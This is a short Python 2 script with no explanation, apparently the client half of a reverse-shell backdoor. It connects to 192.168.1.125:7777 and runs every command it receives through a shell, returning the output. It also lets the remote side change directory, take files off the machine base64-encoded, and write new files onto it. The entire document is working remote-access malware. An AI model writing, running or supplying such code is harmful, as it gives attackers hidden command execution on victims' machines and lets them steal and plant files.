#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    while True:
        res = cliente.recv(1024)
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            cliente.send(result)
        elif res[:8] == "download":
            with open(res[9:],'rb') as file_download:
                cliente.send(base64.b64encode(file_download.read()))
        elif res [:6] == "upload":
            with open(res[7:],'wb') as file_upload:
                datos = cliente.recv(30000)
                file_upload.write(base64.b64decode(datos))       
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1")
            else:
                cliente.send(result)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect((" 192.168.1.125", 7777))
shell()
cliente.close()